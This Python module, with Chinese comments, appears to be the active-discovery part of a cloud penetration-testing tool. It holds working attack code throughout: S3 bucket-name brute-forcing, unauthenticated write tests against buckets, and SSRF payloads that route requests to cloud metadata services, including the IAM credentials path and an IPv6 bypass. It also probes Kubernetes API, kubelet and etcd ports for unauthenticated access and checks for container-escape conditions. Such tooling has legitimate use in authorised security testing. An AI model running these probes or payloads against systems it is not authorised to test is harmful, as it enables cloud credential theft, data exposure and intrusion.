"""
主动发现模块 — S3 枚举 / IMDS 探测 / K8s 未授权 / 元数据服务
"""
import requests
import concurrent.futures
import re
import warnings
from urllib.parse import urljoin

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# ============================================================
# S3 桶名爆破
# ============================================================

S3_SUFFIXES = [
    '', '-prod', '-dev', '-staging', '-test', '-qa',
    '-backup', '-backups', '-logs', '-log', '-data',
    '-assets', '-static', '-cdn', '-media', '-files',
    '-terraform', '-tfstate', '-tf', '-cloudformation', '-cfn',
    '-config', '-conf', '-secrets', '-keys',
    '-db', '-database', '-dump', '-dumps',
    '-artifacts', '-build', '-release', '-deploy',
    '-archive', '-archives', '-old', '-tmp', '-temp',
    '-public', '-private', '-internal', '-shared',
    '-documents', '-docs', '-images', '-img', '-video', '-videos',
    '-source', '-src', '-code', '-repo', '-repos',
    '-web', '-www', '-app', '-api', '-cdn2',
    '-upload', '-uploads', '-download', '-downloads',
    '-user', '-users', '-customer', '-client',
    '-admin', '-dashboard', '-monitor', '-metrics',
    '-output', '-export', '-import', '-batch',
    '-test1', '-test2', '-dev1', '-dev2',
    '-stg', '-uat', '-perf', '-performance',
    '-sandbox', '-playground', '-lab', '-demo',
    '-vpc-flow-logs', '-elb-logs', '-cloudtrail', '-alb-logs',
    '-inventory', '-catalog', '-registry',
    '-analytics', '-reports', '-content',
    '-mobile', '-ios', '-android',
]

S3_REGIONS = [
    'us-east-1', 'us-east-2', 'us-west-1', 'us-west-2',
    'ap-northeast-1', 'ap-northeast-2', 'ap-northeast-3',
    'ap-southeast-1', 'ap-southeast-2', 'ap-south-1',
    'eu-west-1', 'eu-west-2', 'eu-west-3', 'eu-central-1',
    'sa-east-1', 'cn-north-1', 'cn-northwest-1',
]

AZURE_BLOB_ENDPOINTS = [
    'blob.core.windows.net',
    'blob.core.chinacloudapi.cn',
    'blob.core.usgovcloudapi.net',
]

GCP_STORAGE_ENDPOINT = 'https://storage.googleapis.com/storage/v1/b'

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (compatible; cloud-vuln-skill/1.0)'
}

# 请求间隔（秒），避免触发云端限流
REQUEST_DELAY = 0.05


def brute_s3_buckets(keyword, threads=10, delay=None):
    """基于关键词爆破 S3 桶名，返回存在的桶。delay 为请求间隔（秒），默认使用 REQUEST_DELAY。"""
    import time as _time
    found = []
    targets = [f'{keyword}{s}' for s in S3_SUFFIXES]
    _delay = delay if delay is not None else REQUEST_DELAY

    def check_bucket(name):
        if _delay > 0:
            _time.sleep(_delay)
        result = {'name': name, 'public': False, 'exists': False, 'region': None, 'details': ''}
        # 先试全球端点
        try:
            r = requests.head(f'https://{name}.s3.amazonaws.com', headers=HEADERS, timeout=5, allow_redirects=False)
            if r.status_code in [200, 403, 404]:
                if r.status_code == 200:
                    result['public'] = True
                    result['details'] = 'publicly_listable'
                if r.status_code != 404:
                    result['exists'] = True
                    result['region'] = r.headers.get('x-amz-bucket-region', 'us-east-1')
            # 403 = exists but not public
            if r.status_code == 403:
                result['exists'] = True
        except:
            pass

        # 如果全球端点没有返回，可能是区域桶
        if not result['exists']:
            for region in S3_REGIONS[:5]:
                try:
                    url = f'https://{name}.s3.{region}.amazonaws.com'
                    r = requests.head(url, headers=HEADERS, timeout=3, allow_redirects=False)
                    if r.status_code in [200, 403]:
                        result['exists'] = True
                        result['region'] = region
                        if r.status_code == 200:
                            result['public'] = True
                        break
                except:
                    continue

        return result

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_bucket, t): t for t in targets}
        for f in concurrent.futures.as_completed(futures):
            r = f.result()
            if r['exists']:
                found.append(r)

    return found


def probe_bucket_public(bucket_name, region=None):
    """探测单个桶的公开可读写性"""
    result = {
        'name': bucket_name,
        'public_read': False,
        'public_write': False,
        'public_list': False,
        'files': [],
        'error': None
    }

    endpoint = f'https://{bucket_name}.s3.amazonaws.com'
    if region:
        endpoint = f'https://{bucket_name}.s3.{region}.amazonaws.com'

    # 1. 测试列出
    try:
        r = requests.get(endpoint, headers=HEADERS, timeout=8)
        if r.status_code == 200:
            result['public_list'] = True
            # 解析 XML 提取文件名
            keys = re.findall(r'<Key>([^<]+)</Key>', r.text)
            result['files'] = keys[:50]
        if r.status_code == 403:
            result['public_list'] = False
    except Exception as e:
        result['error'] = str(e)

    # 2. 测试写入
    test_key = '.cloud-vuln-skill-test-write'
    try:
        r = requests.put(
            f'{endpoint}/{test_key}',
            data='test-write-permission',
            headers={**HEADERS, 'Content-Type': 'text/plain'},
            timeout=8
        )
        if r.status_code == 200:
            result['public_write'] = True
            # 立即清理
            requests.delete(f'{endpoint}/{test_key}', headers=HEADERS, timeout=5)
    except:
        pass

    # 3. 测试读权限（通过 HEAD 探测常见文件名，不下载内容）
    if not result['public_list'] and not result['public_read']:
        common_files = ['index.html', 'robots.txt', 'favicon.ico']
        for f in common_files:
            try:
                r = requests.head(f'{endpoint}/{f}', headers=HEADERS, timeout=5)
                if r.status_code == 200:
                    result['public_read'] = True
                    result['files'].append(f)
            except:
                pass

    return result


# ============================================================
# IMDS / 元数据服务 SSRF 探测
# ============================================================

def probe_imds(target_url, param_name='url'):
    """探测目标 URL 是否存在 SSRF 可利用 IMDS 元数据服务"""
    results = []

    # 探测 Payload
    probes = [
        {
            'name': 'AWS IMDSv1',
            'target': 'http://169.254.169.254/latest/meta-data/',
            'expected_in_response': ['ami-id', 'instance-id', 'security-groups', 'iam'],
        },
        {
            'name': 'AWS IMDSv1 - IAM Role',
            'target': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'expected_in_response': ['AccessKeyId', 'SecretAccessKey'],
        },
        {
            'name': 'Azure IMDS',
            'target': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'expected_in_response': ['compute', 'network'],
            'headers': {'Metadata': 'true'},
        },
        {
            'name': 'GCP Metadata',
            'target': 'http://metadata.google.internal/computeMetadata/v1/',
            'expected_in_response': ['instance', 'project'],
            'headers': {'Metadata-Flavor': 'Google'},
        },
        {
            'name': '阿里云 IMDS',
            'target': 'http://100.100.100.200/latest/meta-data/',
            'expected_in_response': ['instance-id', 'region-id'],
        },
        {
            'name': 'AWS IMDS IPv6 Bypass',
            'target': 'http://[::ffff:a9fe:a9fe]/latest/meta-data/',
            'expected_in_response': ['ami-id', 'instance-id'],
        },
    ]

    for probe in probes:
        try:
            params = {param_name: probe['target']}
            headers = {**HEADERS, **probe.get('headers', {})}
            r = requests.get(target_url, params=params, headers=headers, timeout=8, allow_redirects=False)

            result = {
                'probe': probe['name'],
                'target': probe['target'],
                'status': r.status_code,
                'vulnerable': False,
                'evidence': '',
            }

            # 判断是否命中
            resp_text = r.text[:2000]
            for keyword in probe['expected_in_response']:
                if keyword.lower() in resp_text.lower():
                    result['vulnerable'] = True
                    result['evidence'] = f'Response contains: {keyword}'
                    break

            # 也检查 302 重定向
            if r.status_code in [301, 302]:
                redirect = r.headers.get('Location', '')
                if '169.254' in redirect or 'metadata' in redirect.lower():
                    result['vulnerable'] = True
                    result['evidence'] = f'Redirect to: {redirect}'

            results.append(result)
        except Exception as e:
            results.append({
                'probe': probe['name'],
                'target': probe['target'],
                'status': 'error',
                'vulnerable': False,
                'evidence': str(e),
            })

    return results


# ============================================================
# K8s 未授权访问探测
# ============================================================

K8S_DANGER_PORTS = {
    6443: 'Kubernetes API Server (TLS)',
    8080: 'Kubernetes API Server (Plain)',
    10250: 'Kubelet API',
    10255: 'Kubelet Read-Only',
    2379: 'etcd Client',
    2380: 'etcd Peer',
    10256: 'kube-proxy Healthz',
    4194: 'cAdvisor',
}

K8S_API_PATHS = [
    '/api/v1/namespaces',
    '/api/v1/pods',
    '/api/v1/nodes',
    '/api/v1/secrets',
    '/apis/rbac.authorization.k8s.io/v1/clusterroles',
    '/version',
    '/healthz',
]


def probe_k8s_unauth(host, port):
    """探测 K8s API Server / Kubelet 是否存在未授权访问"""
    findings = []
    base = f'https://{host}:{port}' if port == 6443 else f'http://{host}:{port}'

    for path in K8S_API_PATHS:
        url = urljoin(base, path)
        try:
            r = requests.get(url, headers=HEADERS, timeout=5, verify=False)
            if r.status_code == 200:
                data = r.json() if r.headers.get('Content-Type', '').startswith('application/json') else {}
                findings.append({
                    'url': url,
                    'port': port,
                    'service': K8S_DANGER_PORTS.get(port, 'unknown'),
                    'status': r.status_code,
                    'unauthorized': True,
                    'evidence': str(data)[:500],
                })
                break  # 找到一个就够了
            elif r.status_code == 403:
                findings.append({
                    'url': url,
                    'port': port,
                    'service': K8S_DANGER_PORTS.get(port, 'unknown'),
                    'status': 403,
                    'unauthorized': False,
                    'evidence': 'Authentication required',
                })
                break
        except requests.exceptions.SSLError:
            # 自签名证书，降级到 HTTP 再试
            try:
                http_url = url.replace('https://', 'http://')
                r = requests.get(http_url, headers=HEADERS, timeout=5)
                if r.status_code == 200:
                    findings.append({
                        'url': http_url,
                        'port': port,
                        'service': K8S_DANGER_PORTS.get(port, 'unknown'),
                        'status': 200,
                        'unauthorized': True,
                    })
            except:
                pass
        except:
            pass

    return findings


def scan_k8s_node(node_ip):
    """扫描一个 K8s 节点的所有高危端口"""
    all_findings = []
    ports_to_check = [6443, 8080, 10250, 10255, 2379, 4194, 10256]

    for port in ports_to_check:
        try:
            findings = probe_k8s_unauth(node_ip, port)
            all_findings.extend(findings)
        except:
            continue

    return all_findings


# ============================================================
# 容器逃逸条件检测
# ============================================================

def detect_container_escape_conditions():
    """
    在容器内运行，检测是否存在逃逸条件。
    返回所有危险配置的列表。
    """
    import os
    import subprocess

    findings = []

    checks = [
        ('/var/run/docker.sock exists?', lambda: os.path.exists('/var/run/docker.sock'),
         'Docker Socket 挂载在容器内，可直接控制宿主机 Docker，创建特权容器逃逸'),

        ('/proc/1/cgroup docker?', lambda: 'docker' in open('/proc/1/cgroup').read().lower(),
         '检测到 Docker 容器环境'),

        ('/proc/1/cgroup kubepods?', lambda: 'kubepods' in open('/proc/1/cgroup').read(),
         '检测到 K8s Pod 环境'),

        ('Privileged?', lambda: _check_capsh_privileged(),
         '容器以 privileged 模式运行，可执行 mount/nsenter 等逃逸操作'),

        ('CAP_SYS_ADMIN?', lambda: _check_capability('cap_sys_admin'),
         '拥有 CAP_SYS_ADMIN，可通过 cgroup release_agent 逃逸'),

        ('CAP_SYS_PTRACE?', lambda: _check_capability('cap_sys_ptrace'),
         '拥有 CAP_SYS_PTRACE，可注入宿主机进程'),

        ('hostPID?', lambda: os.path.exists('/proc/1/root'),
         '共享宿主机 PID 命名空间，可通过 nsenter 逃逸'),

        ('hostPath mount?', lambda: _check_hostpath_mounts(),
         '挂载了宿主机文件系统，可直接读写宿主机文件'),

        ('K8s ServiceAccount Token?', lambda: os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount/token'),
         'Pod 挂载了 K8s ServiceAccount Token，可用于 API Server 操作'),

        ('Docker Socket via mount?', lambda: _check_mount_contains('docker.sock') or _check_mount_contains('containerd.sock'),
         '容器运行时 Socket 被挂载，可通过 Docker/Containerd API 控制宿主机容器'),

        ('IMDS Reachable?', lambda: _check_imds_reachable(),
         '实例元数据服务可达，可获取 IAM 凭证'),
    ]

    for name, check_fn, desc in checks:
        try:
            if check_fn():
                findings.append({
                    'name': name,
                    'vulnerable': True,
                    'impact': desc,
                    'severity': 'CRITICAL' if any(kw in name.lower() for kw in ['privileged', 'docker', 'sys_admin', 'hostpid']) else 'HIGH',
                })
        except:
            pass

    # 检查 K8s RBAC 权限（如果在 Pod 内）
    try:
        token = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read()
        api_server = 'https://kubernetes.default.svc'
        cacert = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
        r = requests.get(
            f'{api_server}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews',
            headers={'Authorization': f'Bearer {token}'},
            verify=cacert,
            timeout=5,
        )
        if r.status_code == 200:
            findings.append({
                'name': 'K8s SelfSubjectAccessReview Available',
                'vulnerable': True,
                'impact': '可以查询当前 ServiceAccount 的权限',
                'severity': 'MEDIUM',
            })
    except:
        pass

    return findings


def _check_capsh_privileged():
    """检查是否 privileged 模式"""
    import subprocess
    try:
        result = subprocess.run(['cat', '/proc/1/status'], capture_output=True, text=True, timeout=3)
        for line in result.stdout.split('\n'):
            if line.startswith('CapEff:'):
                caps_hex = line.split(':')[1].strip()
                caps_int = int(caps_hex, 16)
                # 全能力 = 0x3fffffffff (老内核) 或 0x1ffffff (新内核)
                return caps_int >= 0x1ffffff
    except:
        pass
    return False


def _check_capability(cap_name):
    """检查当前进程是否有某个 capability"""
    import subprocess
    try:
        result = subprocess.run(['capsh', '--print'], capture_output=True, text=True, timeout=3)
        return cap_name in result.stdout.lower()
    except:
        pass
    return False


def _check_hostpath_mounts():
    """检查是否有 hostPath 挂载"""
    try:
        with open('/proc/mounts') as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 2:
                    if parts[1] in ['/host', '/hostroot', '/rootfs', '/node']:
                        return True
                    # 根目录挂载到非标准位置
                    if parts[0].startswith('/dev/') and parts[1] not in ['/', '/etc/hosts', '/etc/hostname', '/etc/resolv.conf']:
                        if parts[1].startswith('/host'):
                            return True
    except:
        pass
    return False


def _check_mount_contains(pattern):
    """检查挂载点是否包含特定文件"""
    try:
        with open('/proc/mounts') as f:
            return any(pattern in line for line in f.readlines())
    except:
        return False


def _check_imds_reachable():
    """检查 IMDS 是否可达"""
    try:
        r = requests.get(
            'http://169.254.169.254/latest/meta-data/',
            headers={'X-aws-ec2-metadata-token-ttl-seconds': '10'},
            timeout=2,
        )
        return r.status_code in [200, 401]  # 200=IMDSv1, 401=IMDSv2要求token
    except:
        # 尝试阿里云
        try:
            r = requests.get('http://100.100.100.200/latest/meta-data/', timeout=2)
            return r.status_code == 200
        except:
            pass
    return False
